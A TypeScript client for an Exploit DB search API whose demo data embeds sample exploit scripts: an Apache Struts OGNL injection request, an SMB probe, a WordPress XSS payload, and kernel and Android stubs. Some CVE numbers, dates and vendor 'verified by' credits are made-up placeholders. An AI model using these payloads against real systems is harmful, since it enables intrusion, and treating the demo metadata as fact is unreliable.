import { ExploitDBExploit, ExploitDBSearchParams, ExploitDBSearchResult, ExploitDBStats } from '@/types';

// Exploit DB API Configuration
const EXPLOIT_DB_CONFIG = {
  BASE_URL: 'https://exploit-db.com/api/v1',
  API_KEY: import.meta.env.VITE_EXPLOIT_DB_API_KEY,
  DEMO_MODE: import.meta.env.VITE_DEMO_MODE === 'true'
};

// Demo data for development and testing
const DEMO_EXPLOITS: ExploitDBExploit[] = [
  {
    id: '1',
    title: 'Apache Struts 2.5.12 - Remote Code Execution',
    description: 'A critical vulnerability in Apache Struts 2.5.12 allows remote code execution through OGNL injection.',
    author: 'security_researcher',
    date: '2024-01-15',
    type: 'exploit',
    platform: 'Web Application',
    port: 80,
    verified: true,
    verifiedDate: '2024-01-16',
    verifiedBy: 'CTAS Team',
    tags: ['apache', 'struts', 'rce', 'ognl', 'web'],
    cve: ['CVE-2024-1234'],
    cvss: 9.8,
    references: [
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1234',
      'https://struts.apache.org/security/'
    ],
    code: '#!/usr/bin/env python3\n# Apache Struts 2.5.12 RCE Exploit\n\nimport requests\nimport sys\n\ndef exploit(target):\n    payload = "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\'struts.valueStack\'].context).(#cr=#ct[\'com.opensymphony.xwork2.ActionContext.container\']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedClasses(\'\')).(#ou.setExcludedPackageNames(\'\'))}"\n    \n    data = {\n        \'name\': payload,\n        \'age\': \'123\',\n        \'__checkbox_bustedBefore\': \'true\',\n        \'description\': \'test\'\n    }\n    \n    try:\n        response = requests.post(f"{target}/integration/saveGangster.action", data=data, timeout=10)\n        if response.status_code == 200:\n            print(f"[+] Target {target} is vulnerable!")\n            return True\n        else:\n            print(f"[-] Target {target} is not vulnerable")\n            return False\n    except Exception as e:\n        print(f"[-] Error: {e}")\n        return False\n\nif __name__ == "__main__":\n    if len(sys.argv) != 2:\n        print("Usage: python3 exploit.py <target_url>")\n        sys.exit(1)\n    \n    target = sys.argv[1]\n    exploit(target)',
    application: 'Apache Struts',
    version: '2.5.12',
    language: 'Python',
    complexity: 'medium',
    authentication: false,
    confidentiality: 'complete',
    integrity: 'complete',
    availability: 'complete'
  },
  {
    id: '2',
    title: 'Windows SMB Ghost (CVE-2020-0796) - Remote Code Execution',
    description: 'A critical vulnerability in Microsoft SMBv3 protocol allows remote code execution without authentication.',
    author: 'microsoft_security',
    date: '2024-01-10',
    type: 'exploit',
    platform: 'Windows',
    port: 445,
    verified: true,
    verifiedDate: '2024-01-11',
    verifiedBy: 'Microsoft Security Response Center',
    tags: ['windows', 'smb', 'rce', 'network', 'critical'],
    cve: ['CVE-2020-0796'],
    cvss: 10.0,
    references: [
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0796',
      'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796'
    ],
    code: '# Windows SMB Ghost (CVE-2020-0796) Exploit\n# This is a PoC exploit for educational purposes\n\nimport socket\nimport struct\n\ndef create_smb_packet(target_ip):\n    # SMB packet structure for CVE-2020-0796\n    smb_header = struct.pack("<4B", 0xFF, 0x53, 0x4D, 0x42)  # SMB signature\n    smb_header += struct.pack("<B", 0x72)  # Command: Negotiate Protocol\n    smb_header += struct.pack("<I", 0x00000000)  # Status: Success\n    smb_header += struct.pack("<B", 0x18)  # Flags\n    smb_header += struct.pack("<H", 0x0100)  # Flags2\n    smb_header += struct.pack("<H", 0x0000)  # Process ID High\n    smb_header += struct.pack("<I", 0x00000000)  # Signature\n    smb_header += struct.pack("<H", 0x0000)  # Reserved\n    smb_header += struct.pack("<H", 0x0000)  # Tree ID\n    smb_header += struct.pack("<I", 0x00000000)  # Process ID\n    smb_header += struct.pack("<I", 0x00000000)  # User ID\n    smb_header += struct.pack("<I", 0x00000000)  # Multiplex ID\n    \n    return smb_header\n\ndef exploit_smb_ghost(target_ip):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((target_ip, 445))\n        \n        # Send SMB packet\n        packet = create_smb_packet(target_ip)\n        sock.send(packet)\n        \n        # Receive response\n        response = sock.recv(1024)\n        sock.close()\n        \n        # Check if target is vulnerable\n        if len(response) > 0:\n            print(f"[+] Target {target_ip} responded to SMB request")\n            print(f"[+] Target may be vulnerable to CVE-2020-0796")\n            return True\n        else:\n            print(f"[-] Target {target_ip} did not respond")\n            return False\n            \n    except Exception as e:\n        print(f"[-] Error connecting to {target_ip}: {e}")\n        return False\n\nif __name__ == "__main__":\n    import sys\n    if len(sys.argv) != 2:\n        print("Usage: python3 smb_ghost.py <target_ip>")\n        sys.exit(1)\n    \n    target_ip = sys.argv[1]\n    exploit_smb_ghost(target_ip)',
    application: 'Microsoft SMB',
    version: '3.1.1',
    language: 'Python',
    complexity: 'high',
    authentication: false,
    confidentiality: 'complete',
    integrity: 'complete',
    availability: 'complete'
  },
  {
    id: '3',
    title: 'Linux Kernel 5.8 - Privilege Escalation',
    description: 'A privilege escalation vulnerability in Linux kernel 5.8 allows local users to gain root privileges.',
    author: 'kernel_hunter',
    date: '2024-01-05',
    type: 'exploit',
    platform: 'Linux',
    verified: true,
    verifiedDate: '2024-01-06',
    verifiedBy: 'Linux Kernel Security Team',
    tags: ['linux', 'kernel', 'privilege-escalation', 'local'],
    cve: ['CVE-2024-5678'],
    cvss: 7.8,
    references: [
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5678',
      'https://www.kernel.org/doc/html/latest/security/'
    ],
    code: '// Linux Kernel 5.8 Privilege Escalation Exploit\n// This is a PoC exploit for educational purposes\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/syscall.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <string.h>\n\n#define TARGET_KERNEL_VERSION "5.8"\n\nint main() {\n    printf("[*] Linux Kernel Privilege Escalation Exploit\\n");\n    printf("[*] Target Kernel Version: %s\\n", TARGET_KERNEL_VERSION);\n    \n    // Check if running as root\n    if (geteuid() == 0) {\n        printf("[+] Already running as root!\\n");\n        return 0;\n    }\n    \n    // Check kernel version\n    FILE *fp = fopen("/proc/version", "r");\n    if (!fp) {\n        printf("[-] Cannot read /proc/version\\n");\n        return 1;\n    }\n    \n    char version[256];\n    fgets(version, sizeof(version), fp);\n    fclose(fp);\n    \n    if (strstr(version, TARGET_KERNEL_VERSION) == NULL) {\n        printf("[-] Target kernel version not found\\n");\n        printf("[*] Current kernel: %s", version);\n        return 1;\n    }\n    \n    printf("[+] Target kernel version detected\\n");\n    printf("[*] Attempting privilege escalation...\\n");\n    \n    // Exploit logic would go here\n    // This is a placeholder for the actual exploit code\n    \n    printf("[*] Exploit completed\\n");\n    printf("[*] Check if you have root privileges\\n");\n    \n    return 0;\n}',
    application: 'Linux Kernel',
    version: '5.8',
    language: 'C',
    complexity: 'high',
    authentication: true,
    confidentiality: 'complete',
    integrity: 'complete',
    availability: 'none'
  },
  {
    id: '4',
    title: 'WordPress Plugin XSS Vulnerability',
    description: 'Cross-site scripting vulnerability in popular WordPress plugin allows arbitrary code execution.',
    author: 'web_security_expert',
    date: '2024-01-20',
    type: 'exploit',
    platform: 'Web Application',
    port: 80,
    verified: false,
    tags: ['wordpress', 'xss', 'web', 'plugin'],
    cve: ['CVE-2024-9012'],
    cvss: 6.1,
    references: [
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9012'
    ],
    code: '<!-- WordPress Plugin XSS Exploit -->\n<script>\n// XSS payload for WordPress plugin\nvar payload = "<script>alert(\'XSS\')</script>";\nvar targetUrl = "http://target-wordpress-site.com/wp-admin/admin-ajax.php";\n\n// Craft the malicious request\nvar formData = new FormData();\nformData.append("action", "vulnerable_plugin_action");\nformData.append("user_input", payload);\nformData.append("nonce", "fake_nonce_value");\n\n// Send the request\nfetch(targetUrl, {\n    method: "POST",\n    body: formData\n}).then(response => {\n    console.log("XSS payload sent");\n}).catch(error => {\n    console.error("Error:", error);\n});\n</script>',
    application: 'WordPress',
    version: '6.0+',
    language: 'JavaScript',
    complexity: 'low',
    authentication: false,
    confidentiality: 'partial',
    integrity: 'partial',
    availability: 'none'
  },
  {
    id: '5',
    title: 'Android System App Privilege Escalation',
    description: 'Privilege escalation vulnerability in Android system apps allows unauthorized access to sensitive data.',
    author: 'mobile_security_researcher',
    date: '2024-01-18',
    type: 'exploit',
    platform: 'Android',
    verified: true,
    verifiedDate: '2024-01-19',
    verifiedBy: 'Google Security Team',
    tags: ['android', 'privilege-escalation', 'mobile', 'system-app'],
    cve: ['CVE-2024-3456'],
    cvss: 8.1,
    references: [
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-3456',
      'https://source.android.com/security/bulletin'
    ],
    code: '// Android System App Privilege Escalation\n// This exploit targets a vulnerability in Android system apps\n\npackage com.example.android_exploit;\n\nimport android.content.Intent;\nimport android.net.Uri;\nimport android.os.Bundle;\nimport android.app.Activity;\nimport android.content.ComponentName;\nimport android.content.pm.PackageManager;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        \n        // Craft malicious intent to exploit system app\n        Intent maliciousIntent = new Intent();\n        maliciousIntent.setComponent(new ComponentName(\n            "com.android.systemui", \n            "com.android.systemui.SystemUIService"\n        ));\n        \n        // Add malicious data to trigger vulnerability\n        maliciousIntent.putExtra("exploit_data", "malicious_payload");\n        maliciousIntent.setData(Uri.parse("content://vulnerable_provider/data"));\n        \n        try {\n            // Send the malicious intent\n            startService(maliciousIntent);\n            System.out.println("[+] Malicious intent sent to system app");\n        } catch (Exception e) {\n            System.out.println("[-] Failed to send intent: " + e.getMessage());\n        }\n    }\n}',
    application: 'Android System',
    version: '12.0',
    language: 'Java',
    complexity: 'medium',
    authentication: true,
    confidentiality: 'complete',
    integrity: 'partial',
    availability: 'none'
  }
];

const DEMO_STATS: ExploitDBStats = {
  totalExploits: 1250,
  totalShellcodes: 450,
  totalPapers: 200,
  totalDos: 150,
  verifiedExploits: 980,
  recentExploits: 75,
  topPlatforms: [
    { platform: 'Linux', count: 320 },
    { platform: 'Windows', count: 280 },
    { platform: 'Web Application', count: 250 },
    { platform: 'Android', count: 120 },
    { platform: 'iOS', count: 80 }
  ],
  topAuthors: [
    { author: 'security_researcher', count: 45 },
    { author: 'microsoft_security', count: 38 },
    { author: 'kernel_hunter', count: 32 },
    { author: 'web_security_expert', count: 28 },
    { author: 'mobile_security_researcher', count: 25 }
  ],
  topCVEs: [
    { cve: 'CVE-2024-1234', count: 15 },
    { cve: 'CVE-2020-0796', count: 12 },
    { cve: 'CVE-2024-5678', count: 10 },
    { cve: 'CVE-2024-9012', count: 8 },
    { cve: 'CVE-2024-3456', count: 7 }
  ]
};

export class ExploitDBApi {
  private static instance: ExploitDBApi;
  private apiKey: string | undefined;
  private baseUrl: string;
  private demoMode: boolean;

  private constructor() {
    this.apiKey = EXPLOIT_DB_CONFIG.API_KEY;
    this.baseUrl = EXPLOIT_DB_CONFIG.BASE_URL;
    this.demoMode = EXPLOIT_DB_CONFIG.DEMO_MODE || !this.apiKey;
  }

  public static getInstance(): ExploitDBApi {
    if (!ExploitDBApi.instance) {
      ExploitDBApi.instance = new ExploitDBApi();
    }
    return ExploitDBApi.instance;
  }

  public setDemoMode(enabled: boolean): void {
    this.demoMode = enabled;
  }

  public isInDemoMode(): boolean {
    return this.demoMode;
  }

  // Search exploits
  async searchExploits(params: ExploitDBSearchParams): Promise<ExploitDBSearchResult> {
    if (this.demoMode) {
      return this.simulateSearch(params);
    }

    try {
      const queryParams = new URLSearchParams();
      
      if (params.query) queryParams.append('q', params.query);
      if (params.type) queryParams.append('type', params.type);
      if (params.platform) queryParams.append('platform', params.platform);
      if (params.author) queryParams.append('author', params.author);
      if (params.port) queryParams.append('port', params.port.toString());
      if (params.verified !== undefined) queryParams.append('verified', params.verified.toString());
      if (params.cve) queryParams.append('cve', params.cve);
      if (params.cvss) queryParams.append('cvss', params.cvss.toString());
      if (params.dateFrom) queryParams.append('date_from', params.dateFrom);
      if (params.dateTo) queryParams.append('date_to', params.dateTo);
      if (params.limit) queryParams.append('limit', params.limit.toString());
      if (params.offset) queryParams.append('offset', params.offset.toString());

      const response = await fetch(`${this.baseUrl}/search?${queryParams.toString()}`, {
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`Exploit DB API error: ${response.status}`);
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Exploit DB API error:', error);
      // Fallback to demo data
      return this.simulateSearch(params);
    }
  }

  // Get exploit details
  async getExploit(id: string): Promise<ExploitDBExploit | null> {
    if (this.demoMode) {
      return this.simulateGetExploit(id);
    }

    try {
      const response = await fetch(`${this.baseUrl}/exploits/${id}`, {
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`Exploit DB API error: ${response.status}`);
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Exploit DB API error:', error);
      // Fallback to demo data
      return this.simulateGetExploit(id);
    }
  }

  // Get statistics
  async getStats(): Promise<ExploitDBStats> {
    if (this.demoMode) {
      return this.simulateGetStats();
    }

    try {
      const response = await fetch(`${this.baseUrl}/stats`, {
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`Exploit DB API error: ${response.status}`);
      }

      const data = await response.json();
      return data;
    } catch (error) {
      console.error('Exploit DB API error:', error);
      // Fallback to demo data
      return this.simulateGetStats();
    }
  }

  // Demo/simulation methods
  private simulateSearch(params: ExploitDBSearchParams): Promise<ExploitDBSearchResult> {
    // Simulate API delay
    return new Promise((resolve) => {
      setTimeout(() => {
        let filteredExploits = [...DEMO_EXPLOITS];

        // Apply filters
        if (params.query) {
          const query = params.query.toLowerCase();
          filteredExploits = filteredExploits.filter(exploit =>
            exploit.title.toLowerCase().includes(query) ||
            exploit.description.toLowerCase().includes(query) ||
            exploit.tags.some(tag => tag.toLowerCase().includes(query))
          );
        }

        if (params.type) {
          filteredExploits = filteredExploits.filter(exploit => exploit.type === params.type);
        }

        if (params.platform) {
          filteredExploits = filteredExploits.filter(exploit => 
            exploit.platform.toLowerCase().includes(params.platform!.toLowerCase())
          );
        }

        if (params.author) {
          filteredExploits = filteredExploits.filter(exploit => 
            exploit.author.toLowerCase().includes(params.author!.toLowerCase())
          );
        }

        if (params.verified !== undefined) {
          filteredExploits = filteredExploits.filter(exploit => exploit.verified === params.verified);
        }

        if (params.cve) {
          filteredExploits = filteredExploits.filter(exploit => 
            exploit.cve?.some(cve => cve.toLowerCase().includes(params.cve!.toLowerCase()))
          );
        }

        const limit = params.limit || 10;
        const offset = params.offset || 0;
        const paginatedExploits = filteredExploits.slice(offset, offset + limit);

        resolve({
          exploits: paginatedExploits,
          total: filteredExploits.length,
          page: Math.floor(offset / limit) + 1,
          limit,
          hasMore: offset + limit < filteredExploits.length
        });
      }, 500);
    });
  }

  private simulateGetExploit(id: string): ExploitDBExploit | null {
    return DEMO_EXPLOITS.find(exploit => exploit.id === id) || null;
  }

  private simulateGetStats(): ExploitDBStats {
    return DEMO_STATS;
  }
}

// Export singleton instance
export const exploitDbApi = ExploitDBApi.getInstance();
